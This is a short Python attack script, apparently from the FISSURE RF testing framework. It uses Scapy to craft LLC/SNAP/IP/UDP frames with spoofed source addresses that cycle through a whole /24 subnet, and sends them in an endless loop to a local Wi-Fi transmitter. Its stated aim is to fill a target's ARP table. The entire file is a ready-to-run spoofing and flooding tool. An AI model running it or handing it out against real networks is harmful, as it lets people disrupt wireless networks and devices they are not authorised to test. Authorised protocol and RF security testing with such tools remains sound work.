from scapy.all import IP,UDP,LLC,SNAP
import socket
import time
import sys

#################################################
############ Default FISSURE Header #############
#################################################
def getArguments():
    udp_source_ip = "192.168.1.200"
    udp_dest_ip = "192.168.1.5"
    udp_source_port = "14321"
    udp_dest_port = "55555"
    udp_data = '48657265277320796f757220747261666669632e'
    interval = .1
    wifi_tx_udp_port = 52001
    wifi_tx_ip_address = "127.0.0.1"
    ignore1 = '5'
    ignore2 = '-1'
    single_ip = 'off'
    notes = 'Generates UDP messages with different source addresses to fill up the target ARP table. Messages are placed in UDP data and sent to a wifi_tx.py UDP port.'
    arg_names = ['udp_source_ip','udp_dest_ip','udp_source_port','udp_dest_port','udp_data','interval','wifi_tx_udp_port','wifi_tx_ip_address','ignore1','ignore2','single_ip','notes']
    arg_values = [udp_source_ip, udp_dest_ip, udp_source_port, udp_dest_port, udp_data, interval, wifi_tx_udp_port, wifi_tx_ip_address, ignore1, ignore2, single_ip, notes]

    return (arg_names,arg_values)


if __name__ == "__main__":

    # Default Values
    get_udp_source_ip = "192.168.1.200"
    get_udp_dest_ip = "192.168.1.5"
    get_udp_source_port = "14321"
    get_udp_dest_port = "55555"
    get_udp_data = '48657265277320796f757220747261666669632e'
    get_interval = .1
    get_wifi_tx_udp_port = 52001
    get_wifi_tx_ip_address = "127.0.0.1"
    get_ignore1 = '5' 
    get_ignore2 = '-1'
    get_single_ip = 'off'

    # Accept Command Line Arguments
    try:
        get_udp_source_ip = sys.argv[1]
        get_udp_dest_ip = sys.argv[2]
        get_udp_source_port = sys.argv[3]
        get_udp_dest_port = sys.argv[4]
        get_udp_data = sys.argv[5]
        get_interval = float(sys.argv[6])
        get_wifi_tx_udp_port = int(sys.argv[7])
        get_wifi_tx_ip_address = sys.argv[8]
        get_ignore1 = int(sys.argv[9])
        get_ignore2 = int(sys.argv[10])
        get_single_ip = sys.argv[11]
    except:
        pass

#################################################

    # LLC/SNAP/IP/UDP Message in UDP Data -> "wifi_tx.py" Port
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # LLC/SNAP/IP/UDP
    pip_bytes = LLC()/SNAP()/IP()/UDP()
    pip_bytes[IP].src = get_udp_source_ip
    pip_bytes[IP].dst = get_udp_dest_ip
    pip_bytes[IP].id = 0x0000
    pip_bytes[IP].flags = 2
    pip_bytes[UDP].sport = int(get_udp_source_port)
    pip_bytes[UDP].dport = int(get_udp_dest_port)
    pip_udp_data = get_udp_data.decode('hex')

    if get_ignore1 > 255:
        get_ignore1 = -1
        
    if get_ignore2 > 255:
        get_ignore2 = -1
    
    while True:
        for n in range(0,256):
            if n != get_ignore1 or n != get_ignore2:
                if str(get_single_ip) in "off":
                    pip_bytes[IP].src = ".".join(get_udp_source_ip.split(".", 3)[:-1]) + '.' + str(n)
               
                if int(pip_bytes[IP].src.split(".", 3)[-1]) != get_ignore1 and int(pip_bytes[IP].src.split(".", 3)[-1]) != get_ignore2:
                    pip_bytes_formatted = str(pip_bytes/pip_udp_data)  

                    udp_socket.sendto(pip_bytes_formatted,(get_wifi_tx_ip_address, get_wifi_tx_udp_port))      
                    time.sleep(get_interval)
